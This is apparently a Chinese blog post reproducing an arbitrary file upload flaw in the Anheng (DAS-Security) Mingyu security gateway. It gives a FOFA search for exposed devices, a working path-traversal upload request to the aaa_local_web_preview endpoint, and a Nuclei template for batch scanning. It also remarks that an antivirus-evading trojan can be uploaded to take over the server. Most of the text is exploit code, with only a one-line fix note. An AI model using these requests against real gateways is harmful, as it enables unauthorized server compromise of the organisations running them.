# 原创
：  漏洞复现--安恒明御安全网关 aaa_local_web_preview 任意文件上传

# 漏洞复现--安恒明御安全网关 aaa_local_web_preview 任意文件上传

## 免责声明：

**文章中涉及的漏洞均已修复，敏感信息均已做打码处理，文章仅做经验分享用途，切勿当真，未授权的攻击属于非法行为！文章中敏感信息均已做多层打马处理。传播、利用本文章所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，作者不为此承担任何责任，一旦造成后果请自行负责**

### 一：漏洞描述

安恒明御安全网关是一个网络安全产品，由安恒信息技术股份有限公司开发和提供。它是一个综合性的安全管理平台，用于保护企业网络免受各种网络威胁的攻击。该产品aaa_local_web_preview端点存在文件上传漏洞。

### 二：漏洞影响版本

安恒明御网关

### 三：网络空间测绘查询

fofa：<br/> `title=="明御安全网关"`<br/> <img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/b8110dd087506dded83e45aa08466d8d.jpeg"/>

### 四：漏洞复现

<img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/dd377b0ee6358d4da48fb4ac79be6012.jpeg"/><br/> POC：

```
POST /webui/?g=aaa_local_web_preview&amp;name=123&amp;read=0&amp;suffix=/../../../test.php HTTP/1.1
Host: x.x.x.x
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
Content-Type: multipart/form-data; boundary=849978f98abe41119122148e4aa65b1a
Accept-Encoding: gzip
Content-Length: 200

--849978f98abe41119122148e4aa65b1a
Content-Disposition: form-data; name="123"; filename="test.php"
Content-Type: text/plain

This page has a vulnerability
--849978f98abe41119122148e4aa65b1a--

```

<img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/40f45bfa30e583ad25d3590b9e0b7008.jpeg"/><br/> success即代表上传成功，访问/test.php<br/> <img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/43054e8ade95c5e102c3745709821eed.jpeg"/><br/> <img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/bd656f6eaf1b305ad82cc7b74f4da628.jpeg"/><br/> 成功解析，可上传免杀木马获取服务器权限。

### 五：批量验证

```
id: Anheng-mingyu-wangguan-upload

info:
  name: Anheng-mingyu-wangguan-upload
  author: 芝士土拨鼠
  severity: high
  description: 安恒明御安全网关是一个网络安全产品，由安恒信息技术股份有限公司开发和提供。它是一个综合性的安全管理平台，用于保护企业网络免受各种网络威胁的攻击。该产品aaa_local_web_preview端点存在文件上传漏洞

requests:
  - raw:
      - |+
        POST /webui/?g=aaa_local_web_preview&amp;name=123&amp;read=0&amp;suffix=/../../../test.php HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
        Content-Type: multipart/form-data; boundary=849978f98abe41119122148e4aa65b1a
        Accept-Encoding: gzip
        Content-Length: 173

        --849978f98abe41119122148e4aa65b1a
        Content-Disposition: form-data; name="123"; filename="test.php"
        Content-Type: text/plain

        This page has a vulnerability
        --849978f98abe41119122148e4aa65b1a--

      - |
        GET /test.php HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
        Accept-Encoding: gzip
    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - 'vulnerability'
      - type: status
        status:
          - 200

```

### 修复建议

限制aaa_local_web_preview的访问权限，联系商家获取修复补丁
